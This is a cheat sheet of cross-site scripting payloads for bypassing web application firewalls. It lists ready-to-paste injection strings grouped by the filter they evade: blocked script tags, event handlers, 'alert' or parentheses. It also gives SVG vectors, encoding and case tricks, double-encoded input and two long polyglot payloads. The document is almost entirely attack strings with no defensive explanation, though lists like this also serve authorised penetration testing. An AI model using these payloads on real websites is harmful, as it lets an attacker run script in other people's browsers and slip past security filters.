# XSS WAF Bypass Payloads

## When `<script>` Tags are Blocked
```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<input/onfocus=alert(1)/autofocus>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
```

## When Event Handlers are Blocked
```html
<a href="javascript:alert(1)">click</a>
<form action="javascript:alert(1)"><button>submit</button></form>
<object data="javascript:alert(1)">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

## When `alert` is Blocked
```javascript
confirm(1)
prompt(1)
console.log(document.domain)
self['al'+'ert'](1)
top[/al/.source+/ert/.source](1)
window['a]ert'.replace(']','l')](1)
Reflect.apply(alert,window,[1])
[].constructor.constructor('alert(1)')()
window.onerror=eval;throw'=alert\x281\x29'
Function('alert(1)')()
```

## When Parentheses are Blocked
```html
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>
<img src=x onerror="window.onerror=alert;throw 1">
```

## SVG Payloads
```html
<svg><script>alert(1)</script></svg>
<svg onload="alert(1)">
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
```

## Encoding Tricks
```html
<!-- HTML entities in event handlers -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Mixed case -->
<ScRiPt>alert(1)</sCrIpT>
<iMg sRc=x oNeRrOr=alert(1)>

<!-- Null bytes (older parsers) -->
<scr%00ipt>alert(1)</scr%00ipt>

<!-- Tab/newline in tag names -->
<img/src=x\nonerror=alert(1)>
<script\x0a>alert(1)</script>
```

## Double Encoding (when app decodes twice)
```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

## Polyglot Payloads
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

```
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouse over=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
```
